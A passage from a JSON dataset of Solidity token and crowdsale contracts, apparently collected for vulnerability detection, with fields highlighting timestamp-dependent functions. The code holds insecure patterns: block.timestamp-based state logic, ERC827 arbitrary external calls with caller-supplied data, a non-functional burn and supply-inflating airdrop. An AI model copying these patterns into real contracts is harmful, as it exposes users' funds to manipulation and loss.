totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract CrowdsaleBase is Haltable, Whitelist {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLib for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n mapping (address => bool) public earlyParticipantWhitelist;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event Whitelisted(address addr, bool status);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\n owner = msg.sender;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {\n Whitelist dc;\n address contract_addr = 0x062e41d1037745dc203e8c1AAcA651B8d157Da96;\n dc = Whitelist(contract_addr);\n require (dc.whitelist(msg.sender));\n require (dc.whitelist(receiver));\n if(getState() == State.PreFunding) {\n if(!earlyParticipantWhitelist[receiver]) {\n throw;\n }\n } else if(getState() == State.Funding) {\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n require(weiAmount >= minimumFundingGoal);\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n require(tokenAmount != 0);\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.plus(weiAmount);\n }\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n return tokenAmount;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEndsAt(uint time) onlyOwner {\n if(now > time) {\n throw;\n }\n if(startsAt > time) {\n throw;\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if(msg.value == 0) throw;\n loadedRefund = loadedRefund.plus(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0) throw;\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.plus(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue)) throw;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\n else return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\n earlyParticipantWhitelist[addr] = status;\n Whitelisted(addr, status);\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) internal;\n}\ncontract Crowdsale is CrowdsaleBase {\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) CrowdsaleBase(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n }\n function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\n uint tokenAmount = fullTokens * 10**token.decimals();\n uint weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address addr, uint128 customerId) public payable {\n if(requiredSignedAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if(requireCustomerId) throw;\n if(requiredSignedAddress) throw;\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerIdWithChecksum(uint128 customerId, bytes1 checksum) public payable {\n if (bytes1(sha3(customerId)) != checksum) throw;\n investWithCustomerId(msg.sender, customerId);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function () public payable {\n invest(msg.sender);\n }\n}\ncontract MintedTokenCappedCrowdsale is Crowdsale {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _maximumSellableTokens) Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function assignTokens(address receiver, uint tokenAmount) internal {\n MintableToken mintableToken = MintableToken(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract StandardTokenExt is StandardToken, ERC827Token, Recoverable {\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n}\ncontract MintableToken is StandardTokenExt {\n using SafeMathLib for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state);\n event Minted(address receiver, uint amount);\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply_ = totalSupply_.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f24"
  },
  "filename": "6811.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n function kill() public onlyOwner {\n selfdestruct(owner);\n }\n}\nlibrary XTVNetworkUtils {\n function verifyXTVSignatureAddress(bytes32 hash, bytes memory sig) internal pure returns (address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65) {\n return (address(0));\n }\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27) {\n v += 27;\n }\n if (v != 27 && v != 28) {\n return (address(0));\n }\n bytes32 prefixedHash = keccak256(\n abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n );\n return ecrecover(prefixedHash, v, r, s);\n }\n}\ncontract XTVNetworkGuard {\n mapping(address => bool) xtvNetworkEndorser;\n modifier validateSignature(\n string memory message,\n bytes32 verificationHash,\n bytes memory xtvSignature\n ) {\n bytes32 xtvVerificationHash = keccak256(abi.encodePacked(verificationHash, message));\n require(verifyXTVSignature(xtvVerificationHash, xtvSignature));\n _;\n }\n function setXTVNetworkEndorser(address _addr, bool isEndorser) public;\n function verifyXTVSignature(bytes32 hash, bytes memory sig) public view returns (bool) {\n address signerAddress = XTVNetworkUtils.verifyXTVSignatureAddress(hash, sig);\n return xtvNetworkEndorser[signerAddress];\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20 {\n bool public paused = false;\n bool public mintingFinished = false;\n mapping(address => uint256) balances;\n mapping(address => mapping(address => uint256)) internal allowed;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n function allowance(address _owner, address spender) public view returns (uint256);\n function increaseApproval(address spender, uint addedValue) public returns (bool);\n function decreaseApproval(address spender, uint subtractedValue) public returns (bool);\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Buy(address indexed _recipient, uint _amount);\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n event Pause();\n event Unpause();\n}\ncontract ERC20Token is ERC20, Ownable {\n using SafeMath for uint256;\n function totalSupply() public view returns (uint256) { return totalSupply_; }\n function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; }\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool) {\n allowed[msg.sender][_spender] = (allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract XTVToken is XTVNetworkGuard, ERC20Token {\n using SafeMath for uint256;\n string public constant name = \"XTV Network\";\n string public constant symbol = \"XTV\";\n uint public constant decimals = 18;\n address public fullfillTeamAddress;\n address public fullfillFounder;\n address public fullfillAdvisors;\n address public XTVNetworkContractAddress;\n bool public airdropActive;\n uint public startTime;\n uint public endTime;\n uint public XTVAirDropped;\n uint public XTVBurned;\n mapping(address => bool) public claimed;\n uint256 private constant TOKEN_MULTIPLIER = 1000000;\n uint256 private constant DECIMALS = 10 ** decimals;\n uint256 public constant INITIAL_SUPPLY = 500 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant EXPECTED_TOTAL_SUPPLY = 1000 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_TEAM = 330 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_ADVISORS = 70 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_FOUNDER = 100 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant ALLOC_AIRDROP = 500 * TOKEN_MULTIPLIER * DECIMALS;\n uint256 public constant AIRDROP_CLAIM_AMMOUNT = 500 * DECIMALS;\n modifier isAirdropActive() {\n require(airdropActive);\n _;\n }\n modifier canClaimTokens() {\n uint256 remainingSupply = balances[address(0)];\n require(!claimed[msg.sender] && remainingSupply > AIRDROP_CLAIM_AMMOUNT);\n _;\n }\n event LogAirdropClaim(\n address addr,\n string token,\n bytes32 verificationHash,\n bytes xtvSignature\n );\n constructor(\n address _fullfillTeam,\n address _fullfillFounder,\n address _fullfillAdvisors\n ) public {\n owner = msg.sender;\n fullfillTeamAddress = _fullfillTeam;\n fullfillFounder = _fullfillFounder;\n fullfillAdvisors = _fullfillAdvisors;\n airdropActive = true;\n startTime = block.timestamp;\n endTime = startTime + 365 days;\n balances[_fullfillTeam] = ALLOC_TEAM;\n balances[_fullfillFounder] = ALLOC_FOUNDER;\n balances[_fullfillAdvisors] = ALLOC_ADVISORS;\n balances[address(0)] = ALLOC_AIRDROP;\n totalSupply_ = INITIAL_SUPPLY;\n }\n function setXTVNetworkEndorser(address _addr, bool isEndorser) public onlyOwner {\n xtvNetworkEndorser[_addr] = isEndorser;\n }\n function claim(\n string memory token,\n bytes32 verificationHash,\n bytes memory xtvSignature\n )\n public\n isAirdropActive\n canClaimTokens\n validateSignature(token, verificationHash, xtvSignature)\n returns (uint256)\n {\n claimed[msg.sender] = true;\n balances[address(0)] = balances[address(0)].sub(AIRDROP_CLAIM_AMMOUNT);\n balances[msg.sender] = balances[msg.sender].add(AIRDROP_CLAIM_AMMOUNT);\n XTVAirDropped = XTVAirDropped.add(AIRDROP_CLAIM_AMMOUNT);\n totalSupply_ = totalSupply_.add(AIRDROP_CLAIM_AMMOUNT);\n emit LogAirdropClaim(msg.sender, token, verificationHash, xtvSignature);\n return balances[msg.sender];\n }\n function burnTokens() public {\n if (block.timestamp > endTime) {\n uint256 remaining = balances[address(0)];\n airdropActive = false;\n XTVBurned = remaining;\n }\n }\n function setXTVNetworkContractAddress(address addr) public onlyOwner {\n XTVNetworkContractAddress = addr;\n }\n function setXTVTokenAirdropStatus(bool _status) public onlyOwner {\n airdropActive = _status;\n }\n function drain() public onlyOwner {\n owner.transfer(address(this).balance);\n }\n}",
  "extract_feature": [
    "function burnTokens() public {\nif (block.timestamp > endTime) {\nuint256 remaining = balances[address(0)];\nairdropActive = false;\nXTVBurned = remaining;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f25"
  },
  "filename": "6822.sol",
  "content": "pragma solidity 0.4.24;\ncontract IMigrationContract {\n function migrate(address _addr, uint256 _tokens, uint256 _totaltokens) public returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal pure returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal pure returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n function safeDiv(uint256 x, uint256 y) internal pure returns(uint256) {\n uint256 z = x / y;\n return z;\n }\n}\ncontract Ownable {\n address public ethFundDeposit;\n event OwnershipTransferred(address indexed ethFundDeposit, address indexed _newFundDeposit);\n constructor() public {\n ethFundDeposit = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == ethFundDeposit);\n _;\n }\n function transferOwnership(address _newFundDeposit) public onlyOwner {\n require(_newFundDeposit != address(0));\n emit OwnershipTransferred(ethFundDeposit, _newFundDeposit);\n ethFundDeposit = _newFundDeposit;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused {\n require(paused);\n _;\n }\n function pause() public onlyOwner whenNotPaused {\n paused = true;\n emit Pause();\n }\n function unpause() public onlyOwner whenPaused {\n paused = false;\n emit Unpause();\n }\n}\ncontract controllable is Ownable {\n event AddToBlacklist(address _addr);\n event DeleteFromBlacklist(address _addr);\n mapping (address => bool) internal blacklist;\n function addtoblacklist(address _addr) public onlyOwner {\n blacklist[_addr] = true;\n emit AddToBlacklist(_addr);\n }\n function deletefromblacklist(address _addr) public onlyOwner {\n blacklist[_addr] = false;\n emit DeleteFromBlacklist(_addr);\n }\n function isBlacklist(address _addr) public view returns(bool) {\n return blacklist[_addr];\n }\n}\ncontract Lockable is Ownable, SafeMath {\n mapping (address => uint256) balances;\n mapping (address => uint256) totalbalances;\n uint256 public totalreleaseblances;\n mapping (address => mapping (uint256 => uint256)) userbalances;\n mapping (address => mapping (uint256 => uint256)) userRelease;\n mapping (address => mapping (uint256 => uint256)) isRelease;\n mapping (address => mapping (uint256 => uint256)) userChargeTime;\n mapping (address => uint256) userChargeCount;\n mapping (address => mapping (uint256 => uint256)) lastCliff;\n mapping (address => mapping (uint256 => mapping (uint256 => uint256))) userbalancesSegmentation;\n uint256 internal duration = 30*15 days;\n uint256 internal cliff = 90 days;\n event userlockmechanism(address _addr,uint256 _amount,uint256 _timestamp);\n event userrelease(address _addr, uint256 _times, uint256 _amount);\n modifier onlySelfOrOwner(address _addr) {\n require(msg.sender == _addr || msg.sender == ethFundDeposit);\n _;\n }\n function LockMechanism (\n address _addr,\n uint256 _value\n )\n internal\n {\n require(_addr != address(0));\n require(_value != 0);\n userChargeCount[_addr] = safeAdd(userChargeCount[_addr],1);\n uint256 _times = userChargeCount[_addr];\n userChargeTime[_addr][_times] = ShowTime();\n userbalances[_addr][_times] = _value;\n initsegmentation(_addr,userChargeCount[_addr],_value);\n totalbalances[_addr] = safeAdd(totalbalances[_addr],_value);\n isRelease[_addr][_times] = 0;\n emit userlockmechanism(_addr,_value,ShowTime());\n }\n function initsegmentation(address _addr,uint256 _times,uint256 _value) internal {\n for (uint8 i = 1 ; i <= 5 ; i++ ) {\n userbalancesSegmentation[_addr][_times][i] = safeDiv(_value,5);\n }\n }\n function CalcPeriod(address _addr, uint256 _times) public view returns (uint256) {\n uint256 userstart = userChargeTime[_addr][_times];\n if (ShowTime() >= safeAdd(userstart,duration)) {\n return 5;\n }\n uint256 timedifference = safeSubtract(ShowTime(),userstart);\n uint256 period = 0;\n for (uint8 i = 1 ; i <= 5 ; i++ ) {\n if (timedifference >= cliff) {\n timedifference = safeSubtract(timedifference,cliff);\n period += 1;\n }\n }\n return period;\n }\n function ReleasableAmount(address _addr, uint256 _times) public view returns (uint256) {\n require(_addr != address(0));\n uint256 period = CalcPeriod(_addr,_times);\n if (safeSubtract(period,isRelease[_addr][_times]) > 0){\n uint256 amount = 0;\n for (uint256 i = safeAdd(isRelease[_addr][_times],1) ; i <= period ; i++ ) {\n amount = safeAdd(amount,userbalancesSegmentation[_addr][_times][i]);\n }\n return amount;\n } else {\n return 0;\n }\n }\n function release(address _addr, uint256 _times) external onlySelfOrOwner(_addr) {\n uint256 amount = ReleasableAmount(_addr,_times);\n require(amount > 0);\n userRelease[_addr][_times] = safeAdd(userRelease[_addr][_times],amount);\n balances[_addr] = safeAdd(balances[_addr],amount);\n lastCliff[_addr][_times] = ShowTime();\n isRelease[_addr][_times] = CalcPeriod(_addr,_times);\n totalreleaseblances = safeAdd(totalreleaseblances,amount);\n emit userrelease(_addr, _times, amount);\n }\n function ShowTime() internal view returns (uint256) {\n return block.timestamp;\n }\n function totalBalanceOf(address _addr) public view returns (uint256) {\n return totalbalances[_addr];\n }\n function ShowRelease(address _addr, uint256 _times) public view returns (uint256) {\n return userRelease[_addr][_times];\n }\n function ShowUnrelease(address _addr, uint256 _times) public view returns (uint256) {\n return safeSubtract(userbalances[_addr][_times],ShowRelease(_addr,_times));\n }\n function ShowChargeTime(address _addr, uint256 _times) public view returns (uint256) {\n return userChargeTime[_addr][_times];\n }\n function ShowChargeCount(address _addr) public view returns (uint256) {\n return userChargeCount[_addr];\n }\n function ShowNextCliff(address _addr, uint256 _times) public view returns (uint256) {\n return safeAdd(lastCliff[_addr][_times],cliff);\n }\n function ShowSegmentation(address _addr, uint256 _times,uint256 _period) public view returns (uint256) {\n return userbalancesSegmentation[_addr][_times][_period];\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is controllable, Pausable, Token, Lockable {\n function transfer(address _to, uint256 _value) public whenNotPaused() returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to] && !isBlacklist(msg.sender)) {\n balances[msg.sender] = safeSubtract(balances[msg.sender],_value);\n totalbalances[msg.sender] = safeSubtract(totalbalances[msg.sender],_value);\n balances[_to] = safeAdd(balances[_to],_value);\n totalbalances[_to] = safeAdd(totalbalances[_to],_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused() returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to] && !isBlacklist(msg.sender)) {\n balances[_to] = safeAdd(balances[_to],_value);\n totalbalances[_to] = safeAdd(totalbalances[_to],_value);\n balances[_from] = safeSubtract(balances[_from],_value);\n totalbalances[_from] = safeSubtract(totalbalances[_from],_value);\n allowed[_from][msg.sender] = safeSubtract(allowed[_from][msg.sender],_value);\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract BugXToken is StandardToken 